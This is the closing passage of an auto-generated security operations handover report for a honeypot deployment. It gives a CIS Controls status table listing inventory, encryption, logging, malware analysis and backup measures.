- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-21T02:25:51Z_
